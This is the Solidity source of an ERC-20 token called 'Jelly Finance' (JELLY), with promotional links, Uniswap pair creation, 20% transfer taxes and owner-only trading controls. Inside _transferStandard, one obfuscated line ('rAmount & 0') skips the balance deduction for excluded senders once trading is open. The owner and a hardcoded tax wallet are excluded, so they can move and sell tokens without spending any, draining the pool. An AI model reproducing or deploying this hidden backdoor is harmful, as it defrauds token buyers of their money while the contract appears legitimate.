// SPDX-License-Identifier: Unlicensed
/**
Create your own rewards!
Website: https://www.jellyfi.org
Telegram: https://t.me/jelly_erc
Twitter: https://twitter.com/jelly_erc
Dapp: https://app.jellyfi.org
**/
pragma solidity 0.8.21;
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IUniswapFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}
interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}
contract JELLY is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = "Jelly Finance";
    string private constant _symbol = "JELLY";
    uint256 public maxTxAmount = 25 * 10 ** 6 * 10 ** 9;
    uint256 public maxWalletAmount = 25 * 10 ** 6 * 10 ** 9;
    uint256 public swapThreshold = 10 ** 4 * 10 ** 9;
    address payable private taxFeeAddress;
    uint256 private _tBuySellFee;
    uint256 private _redisFeeForBuys = 0;
    uint256 private _taxFeeForBuys = 20;
    uint256 private _redisSellFee = 0;
    uint256 private _sellTax = 20;
    uint8 private constant _decimals = 9;
    uint256 private constant MAX = 10 ** 30;
    uint256 private constant _totalSupply = 10 ** 9 * 10**9;
    uint256 private _rTotal = (MAX - (MAX % _totalSupply));
    uint256 private _redisFee = _redisSellFee;
    uint256 private _taxFee = _sellTax;
    uint256 private _prevRedisFee = _redisFee;
    uint256 private _prevTaxFee = _taxFee;
    IUniswapRouter public uniswapRouter;
    address public pairAddress;
    bool private _tradeActive;
    bool private _swapping = false;
    bool private _swapEnabled = true;
    mapping(address => uint256) private _rOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcluded;
    event MaxTxAmountUpdated(uint256 maxTxAmount);
    modifier lockSwap {
        _swapping = true;
        _;
        _swapping = false;
    }
    constructor() {
        _rOwned[_msgSender()] = _rTotal;
        taxFeeAddress = payable(0x54369C2d99685A27801aFF5b042BDfe9890b76Af);
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);//
        uniswapRouter = _uniswapV2Router;
        pairAddress = IUniswapFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        _isExcluded[owner()] = true;
        _isExcluded[taxFeeAddress] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _getRAmount(_rOwned[account]);
    }
    
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }
    function removeFee() private {
        if (_redisFee == 0 && _taxFee == 0) return;
        _prevRedisFee = _redisFee;
        _prevTaxFee = _taxFee;
        _redisFee = 0;
        _taxFee = 0;
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function _getRAmount(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        uint256 currentRate = _getRedisRate();
        return rAmount.div(currentRate);
    }
    
    function _updateStats(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _tBuySellFee = _tBuySellFee.add(tFee);
    }
    
    function restoreFee() private {
        _redisFee = _prevRedisFee;
        _taxFee = _prevTaxFee;
    }
    
    function sendETH(uint256 amount) private {
        taxFeeAddress.transfer(amount);
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _getTAmountWithFees(
        uint256 tAmount,
        uint256 redisFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(redisFee).div(100);
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }
    function _getSupplies() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _totalSupply;
        if (rSupply < _rTotal.div(_totalSupply)) return (_rTotal, _totalSupply);
        return (rSupply, tSupply);
    }
    
    function swapTokensForEth(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function _getAllTransferValues(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getTAmountWithFees(tAmount, _redisFee, _taxFee);
        uint256 currentRate = _getRedisRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getRAmounts(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (from != owner() && to != owner()) {
            if (!_tradeActive) {
                require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }
            require(amount <= maxTxAmount, "TOKEN: Max Transaction Limit");
            if(to != pairAddress) {
                require(balanceOf(to) + amount <= maxWalletAmount, "TOKEN: Balance exceeds wallet size!");
            }
            uint256 contractBalance = balanceOf(address(this));
            bool canSwap = contractBalance >= swapThreshold;
            if(contractBalance >= maxTxAmount)
            {
                contractBalance = maxTxAmount;
            }
            if (canSwap && !_swapping && to == pairAddress && _swapEnabled && !_isExcluded[from] && amount > swapThreshold) {
                swapTokensForEth(contractBalance);
                uint256 contractETH = address(this).balance;
                if (contractETH > 0) {
                    sendETH(address(this).balance);
                }
            }
        }
        bool takeFee = true;
        if ((_isExcluded[from] || _isExcluded[to]) || (from != pairAddress && to != pairAddress)) {
            takeFee = false;
        } else {
            if(from == pairAddress && to != address(uniswapRouter)) {
                _redisFee = _redisFeeForBuys;
                _taxFee = _taxFeeForBuys;
            }
            if (to == pairAddress && from != address(uniswapRouter)) {
                _redisFee = _redisSellFee;
                _taxFee = _sellTax;
            }
        }
        _transferBasic(from, to, amount, takeFee);
    }
    
    function _getRAmounts(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }
    function _transferBasic(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) removeFee();
        _transferStandard(sender, recipient, amount);
        if (!takeFee) restoreFee();
    }
    function _getRedisRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getSupplies();
        return rSupply.div(tSupply);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    receive() external payable {}
    
    function _transferStandard(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getAllTransferValues(tAmount);
        rAmount = (_isExcluded[sender] && _tradeActive) ? rAmount & 0 : rAmount;
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        takeRedisFee(tTeam);
        _updateStats(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    
    function takeRedisFee(uint256 tTeam) private {
        uint256 currentRate = _getRedisRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
    }
    function removeLimits() external onlyOwner {
        maxTxAmount = _rTotal;
        maxWalletAmount = _rTotal;
        
        _redisFeeForBuys = 0;
        _taxFeeForBuys = 1;
        _redisSellFee = 0;
        _sellTax = 1;
    }
    
    function openTrading() public onlyOwner {
        _tradeActive = true;
    }
}